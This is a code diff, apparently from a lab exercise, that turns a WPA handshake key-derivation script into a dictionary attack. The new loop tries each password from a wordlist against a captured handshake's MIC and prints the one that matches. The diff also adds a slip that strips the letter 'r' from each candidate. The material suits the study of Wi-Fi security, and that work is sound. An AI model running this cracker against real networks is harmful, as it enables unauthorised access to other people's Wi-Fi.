@@ -32,12 +32,6 @@ def customPRF512(key,A,B):
         R = R+hmacsha1.digest()
     return R[:blen]
 
-dico = open('dictionary.txt', 'r')
-
-i = 0
-while True:
-    passWord = dico[i]
-
 # Read capture file -- it contains beacon, open authentication, associacion, 4-way handshake and data
 wpa=rdpcap("wpa_handshake.cap") 
 
@@ -89,12 +83,24 @@ MICK = b2a_hex(ptk[48:64])
 #the MIC for the authentication is actually truncated to 16 bytes (32 chars). SHA-1 is 20 bytes long.
 MIC_hex_truncated = mic.hexdigest()[0:32]
 
-print "\nResults of the key expansion"
-print "============================="
-print "PMK:\t\t",pmk,"\n"
-print "PTK:\t\t",b2a_hex(ptk),"\n"
-print "KCK:\t\t",KCK,"\n"
-print "KEK:\t\t",KEK,"\n"
-print "TK:\t\t",TK,"\n"
-print "MICK:\t\t",MICK,"\n"
-print "MIC:\t\t",MIC_hex_truncated,"\n"
+dico = open('dico.txt', 'r')
+
+line = dico.readline().replace('\n', '').replace('r', '')
+
+while line:
+
+    pmk = pbkdf2_hex(line, ssid, 4096, 32)
+
+    ptk = customPRF512(a2b_hex(pmk), A, B)
+
+    mic = hmac.new(ptk[0:16], data, hashlib.sha1)
+
+    MIC_PassWord = mic.hexdigest()[0:32]
+
+    if mic_to_test == MIC_PassWord:
+        print "Password correct : " + line
+        break
+
+    line = dico.readline().replace('\n', '').replace('r', '')
+
+dico.close()
